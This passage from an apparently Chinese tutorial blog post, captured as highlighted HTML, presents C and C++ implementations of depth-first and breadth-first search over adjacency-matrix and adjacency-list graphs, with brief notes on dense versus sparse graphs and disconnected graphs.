(amGraph-&gt;arcs[sub][i]!=<span class="hljs-number">0</span>&amp;&amp;visited[i]==<span class="hljs-number">0</span>)&#123;<br>            DFS(amGraph,visited,i);<br>        &#125;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    creatGraph(&amp;amGraph);<span class="hljs-comment">//创建邻接矩阵</span><br>    DFS(amGraph,ints,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>  <br></code></pre></td></tr></table></figure></li></ul><h4 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a><strong>邻接表</strong></h4><ul><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> // 边表节点</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> adjvex; <span class="hljs-comment">// 与顶点相连的邻接点下标(adjoin：邻接)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 指向顶点的下一个邻接点</span><br>&#125; EdgeNode;<br>  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vnode</span>       // 顶点结构</span><br><span class="hljs-class">&#123;</span><br>    VerTexType vex;      <span class="hljs-comment">// 存储顶点名</span><br>    EdgeNode *firstedge; <span class="hljs-comment">// 边表头指针，指向顶点第一个邻接点</span><br>&#125; VertexNode, AdjList[MVNum];<br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br>  <br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<br>  <br>&#125;<br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatAdjacencyList</span><span class="hljs-params">(AMGraph *amGraph, AdjList adjList)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        adjList[i].vex = amGraph-&gt;vexs[i];<br>        adjList[i].firstedge = <span class="hljs-literal">NULL</span>;<br>        EdgeNode *moveNode = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph-&gt;vexnum; ++j) &#123;<br>            <span class="hljs-comment">//下面就是创建链表的过程，只是在第一个的时候相当于创建头节点</span><br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//=1说明连同</span><br>                <span class="hljs-keyword">if</span> (adjList[i].firstedge == <span class="hljs-literal">NULL</span>) &#123;<br>                    adjList[i].firstedge=(EdgeNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> node));<br>                    adjList[i].firstedge-&gt;adjvex = j;<br>                    adjList[i].firstedge-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode = adjList[i].firstedge;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    EdgeNode *tem=(EdgeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(EdgeNode));<br>                    tem-&gt;adjvex=j;<br>                    tem-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode-&gt;next=tem;<br>                    moveNode=moveNode-&gt;next;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-comment">//邻接矩阵</span><br><span class="hljs-comment">/*void DFS(AMGraph *amGraph, int visited[],int sub) &#123;</span><br><span class="hljs-comment">    printf(&quot;%c&quot;,amGraph-&gt;vexs[sub]);</span><br><span class="hljs-comment">    visited[sub]=1;</span><br><span class="hljs-comment">    for (int i = 0; i &lt; amGraph-&gt;vexnum; ++i) &#123;</span><br><span class="hljs-comment">        if (amGraph-&gt;arcs[sub][i]!=0&amp;&amp;visited[i]==0)&#123;</span><br><span class="hljs-comment">            DFS(amGraph,visited,i);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;*/</span><br>  <br>  <br><span class="hljs-comment">//邻接表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(AdjList adjList,<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> sub)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,adjList[sub].vex);<br>    ints[sub]=<span class="hljs-number">1</span>;<br>    EdgeNode *moveNode=adjList[sub].firstedge;<br>    <span class="hljs-keyword">while</span>(moveNode!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span>(ints[moveNode-&gt;adjvex]==<span class="hljs-number">0</span>)&#123;<br>            DFS(adjList,ints,moveNode-&gt;adjvex);<br>        &#125;<br>        moveNode=moveNode-&gt;next;<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    AdjList adjList=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//邻接表的点集合，全部初始化</span><br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    creatGraph(&amp;amGraph);<span class="hljs-comment">//创建邻接矩阵</span><br>    creatAdjacencyList(amGraph,adjList);<span class="hljs-comment">//创建邻接表</span><br>    DFS(adjList,ints,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>  <br></code></pre></td></tr></table></figure></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>稠密图适用于邻接矩阵上进行深度遍历</p><p>稀疏图适用于在邻接表上深度遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/DFS%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87%E5%88%86%E6%9E%90.png"></p><h4 id="非连通图"><a href="#非连通图" class="headerlink" title="非连通图"></a>非连通图</h4><ol><li>可以想象成两个图，然后增加一个虚拟节点，将图穿起来</li><li>如果图的数量不是2个，那就只能在非第一次遍历的图中再选一个图的随机的一个节点开始遍历</li></ol><h3 id="广度优先搜索（BFS）"><a href="#广度优先搜索（BFS）" class="headerlink" title="广度优先搜索（BFS）"></a>广度优先搜索（BFS）</h3><h4 id="邻接矩阵-1"><a href="#邻接矩阵-1" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph, *pAMGraph;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">creatGraph</span><span class="hljs-params">(pAMGraph &amp;amGraph, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    amGraph = <span class="hljs-keyword">new</span> AMGraph;<br>    amGraph-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>    &#125;<br>    amGraph-&gt;vexnum = num;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            cin &gt;&gt; amGraph-&gt;arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph-&gt;arcnum++;<span class="hljs-comment">//计算边数</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    amGraph-&gt;arcnum /= <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BFS</span><span class="hljs-params">(pAMGraph amGraph, <span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> sub)</span> </span>&#123;<br>    queue&lt;<span class="hljs-type">int</span>&gt; queue;<br>    queue.<span class="hljs-built_in">push</span>(sub);<span class="hljs-comment">//先push，进入循环，但是记得在ints里面标记被push</span><br>    ints[sub]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (!queue.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[queue.<span class="hljs-built_in">front</span>()][i] == <span class="hljs-number">1</span>&amp;&amp;ints[i]==<span class="hljs-number">0</span>) &#123;<br>                queue.<span class="hljs-built_in">push</span>(i);<br>                ints[i]=<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        cout&lt;&lt;amGraph-&gt;vexs[queue.<span class="hljs-built_in">front</span>()];<br>        queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    pAMGraph amGraph = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-type">int</span> num;<br>    cin &gt;&gt; num;<span class="hljs-comment">//输入节点数</span><br>    <span class="hljs-built_in">creatGraph</span>(amGraph, num);<br>    <span class="hljs-type">int</span> *ints=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[num];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        *(ints+i)=<span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-comment">//将被查看表全部设为0</span><br>    <span class="hljs-built_in">BFS</span>(amGraph, ints, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">delete</span>[] ints;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="邻接表-1"><a href="#邻接表-1" class="headerlink" title="邻接表"></a>邻接表</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> // 边表节点</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> adjvex; <span class="hljs-comment">// 与顶点相连的邻接点下标(adjoin：邻接)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 指向顶点的下一个邻接点</span><br>&#125; EdgeNode;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vnode</span>       // 顶点结构</span><br><span class="hljs-class">&#123;</span><br>    VerTexType vex;      <span class="hljs-comment">// 存储顶点名</span><br>    EdgeNode *firstedge; <span class="hljs-comment">// 边表头指针，指向顶点第一个邻接点</span><br>&#125; VertexNode, AdjList[MVNum];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph,<span class="hljs-type">int</span> num)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br><br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">creatAdjacencyList</span><span class="hljs-params">(AMGraph *amGraph, AdjList adjList)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        adjList[i].vex = amGraph-&gt;vexs[i];<br>        adjList[i].firstedge = <span class="hljs-literal">NULL</span>;<br>        EdgeNode *moveNode = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph-&gt;vexnum; ++j) &#123;<br>            <span class="hljs-comment">//下面就是创建链表的过程，只是在第一个的时候相当于创建头节点</span><br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//=1说明连同</span><br>                <span class="hljs-keyword">if</span> (adjList[i].firstedge == <span class="hljs-literal">NULL</span>) &#123;<br>                    adjList[i].firstedge=(EdgeNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> node));<br>                    adjList[i].firstedge-&gt;adjvex = j;<br>                    adjList[i].firstedge-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode = adjList[i].firstedge;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    EdgeNode *tem=(EdgeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(EdgeNode));<br>                    tem-&gt;adjvex=j;<br>                    tem-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode-&gt;next=tem;<br>                    moveNode=moveNode-&gt;next;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//邻接矩阵</span><br><span class="hljs-comment">/*void DFS(AMGraph *amGraph, int visited[],int sub) &#123;</span><br><span class="hljs-comment">    printf(&quot;%c&quot;,amGraph-&gt;vexs[sub]);</span><br><span class="hljs-comment">    visited[sub]=1;</span><br><span class="hljs-comment">    for (int i = 0; i &lt; amGraph-&gt;vexnum; ++i) &#123;</span><br><span class="hljs-comment">        if (amGraph-&gt;arcs[sub][i]!=0&amp;&amp;visited[i]==0)&#123;</span><br><span class="hljs-comment">            DFS(amGraph,visited,i);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;*/</span><br><br><br><span class="hljs-comment">//邻接表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BFS</span><span class="hljs-params">(AdjList adjList,<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> sub)</span>&#123;<br>    <span class="hljs-keyword">if</span>(adjList[sub].vex==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ints[sub]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,adjList[sub].vex);<br>        ints[sub]=<span class="hljs-number">1</span>;<br>    &#125;<br>    EdgeNode *moveNode=adjList[sub].firstedge;<br>    <span class="hljs-keyword">while</span>(moveNode!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span>(ints[moveNode-&gt;adjvex]==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,adjList[moveNode-&gt;adjvex].vex);<br>            ints[moveNode-&gt;adjvex]=<span class="hljs-number">1</span>;<br>        &#125;<br>        moveNode=moveNode-&gt;next;<br>    &#125;<br>    BFS(adjList,ints,sub+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    AdjList adjList=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//邻接表的点集合，全部初始化</span><br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input the number of node: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br>    <span class="hljs-type">int</span>* ints = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>)*num);<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        *(ints+i)=<span class="hljs-number">0</span>;<br>    &#125;<br>    creatGraph(&amp;amGraph,num);<span class="hljs-comment">//创建邻接矩阵</span><br>    creatAdjacencyList(amGraph,adjList);<span class="hljs-comment">//创建邻接表</span><br>    BFS(adjList,ints,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p><img 